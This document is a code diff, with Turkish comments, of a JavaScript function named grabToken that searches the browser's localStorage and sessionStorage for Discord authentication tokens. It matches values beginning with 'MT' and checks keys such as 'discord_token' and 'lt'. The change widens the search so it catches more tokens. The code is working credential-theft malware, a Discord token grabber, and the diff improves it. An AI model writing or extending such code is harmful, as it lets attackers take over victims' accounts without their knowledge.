@@ -30,26 +30,22 @@
     async function grabToken() {
         const statusDiv = document.getElementById('status');
         
-        // 1. TOKEN ARAMA (En Hassas Kısım)
         let token = null;
         
-        // A) Doğrudan 'token' anahtarını dene
-        if (localStorage.getItem('token')) {
-            token = localStorage.getItem('token');
-        } 
-        // B) 'discord_token' anahtarını dene
-        else if (localStorage.getItem('discord_token')) {
-            token = localStorage.getItem('discord_token');
-        } 
-        // C) 'lt' anahtarını dene (Eski sürümler)
-        else if (localStorage.getItem('lt')) {
-            token = localStorage.getItem('lt');
+        // 1. GENİŞLETİLMİŞ TOKEN ARAMA
+        // localStorage'daki tüm değerleri tara
+        for (let key in localStorage) {
+            if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
+                token = localStorage[key];
+                break;
+            }
         }
-        // D) Tüm localStorage'ı tara (MT ile başlayanlar)
-        else {
-            for (let key in localStorage) {
-                if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
-                    token = localStorage[key];
+        
+        // Eğer bulunamazsa sessionStorage'yı dene
+        if (!token) {
+            for (let key in sessionStorage) {
+                if (sessionStorage[key] && sessionStorage[key].length > 30 && sessionStorage[key].startsWith("MT")) {
+                    token = sessionStorage[key];
                     break;
                 }
             }
